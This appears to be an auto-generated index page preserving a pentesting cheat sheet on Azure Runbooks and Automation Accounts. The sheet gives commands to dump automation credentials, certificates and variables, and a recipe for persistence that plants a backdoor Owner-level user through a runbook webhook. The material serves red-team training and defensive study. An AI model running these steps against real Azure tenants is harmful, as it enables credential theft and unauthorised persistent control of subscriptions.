---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure Services - Runbook and Automation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-services-runbook` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-runbook.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure Services - Runbook and Automation](../../topics/cloud/azure-services-runbook-and-automation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-services-runbook |
| name | Azure Services - Runbook and Automation |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-services-runbook.md |

## Preserved Source Material

````yaml
_body: "# Azure Services - Runbook and Automation\n\n## Runbook\n\nRunbook must be **SAVED** and **PUBLISHED** before running\
  \ it.\n\n### List the Runbooks\n\n```ps1\nGet-AzAutomationAccount | Get-AzAutomationRunbook\n```\n\n### Create a Runbook\n\
  \n* Check user right for automation\n\n    ```powershell\n    az extension add --upgrade -n automation\n    az automation\
  \ account list # if it doesn't return anything the user is not a part of an Automation group\n    az ad signed-in-user list-owned-objects\n\
  \    ```\n\n* Add the user to the \"Automation\" group: `Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID>\
  \ -Verbose`\n* Get the role of a user on the Automation account: `Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>`.\
  \ NOTE: Contributor or higher privileges accounts can create and execute Runbooks\n* List hybrid workers: `Get-AzAutomationHybridWorkerGroup\
  \ -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>`\n* Create a Powershell Runbook: `Import-AzAutomationRunbook\
  \ -Name <RUNBOOK-NAME> -Path C:\\Tools\\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>\
  \ -Type PowerShell -Force -Verbose`\n* Publish the Runbook: `Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName\
  \ <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`\n* Start the Runbook: `Start-AzAutomationRunbook -RunbookName\
  \ <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`\n\
  \n## Automation Account\n\n### List Automation Accounts\n\nAzure Automation provides a way to automate the repetitive tasks\
  \ you perform in your Azure environment.\n\n```ps1\nGet-AzAutomationAccount\n```\n\n### Get Automation Credentials\n\n```ps1\n\
  Get-AzAutomationAccount | Get-AzAutomationCredential\nGet-AzAutomationAccount | Get-AzAutomationConnection\nGet-AzAutomationAccount\
  \ | Get-AzAutomationCertificate\nGet-AzAutomationAccount | Get-AzAutomationVariable\n```\n\n### Persistence via Automation\
  \ Accounts\n\n* Create a new Automation Account\n    * \"Create Azure Run As account\": Yes\n* Import a new runbook that\
  \ creates an AzureAD user with Owner permissions for the subscription*\n    * Sample runbook [NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)\n\
  \    * Publish the runbook\n    * Add a webhook to the runbook\n* Add the AzureAD module to the Automation account\n   \
  \ * Update the Azure Automation Modules\n* Assign \"User Administrator\" and \"Subscription Owner\" rights to the automation\
  \ account\n* Trigger the webhook with a post request to create the new user\n\n    ```powershell\n    $uri = \"https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d\"\
  \n    $AccountInfo  = @(@{RequestBody=@{Username=\"BackdoorUsername\";Password=\"BackdoorPassword\"}})\n    $body = ConvertTo-Json\
  \ -InputObject $AccountInfo\n    $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body\n    ```\n\n## Desired\
  \ State Configuration\n\n### List the DSC\n\n```ps1\nGet-AzAutomationAccount | Get-AzAutomationDscConfiguration\n```\n\n\
  ### Export the configuration\n\n```ps1\n$DSCName = ${dscToExport}\nGet-AzAutomationAccount | Get-AzAutomationDscConfiguration\
  \ | where {$_.name -match $DSCName} | Export-AzAutomationDscConfiguration -OutputFolder (get-location) -Debug\n```\n\n##\
  \ References\n\n* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)"
_relative_path: cloud/azure/azure-services-runbook.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-runbook.md
````
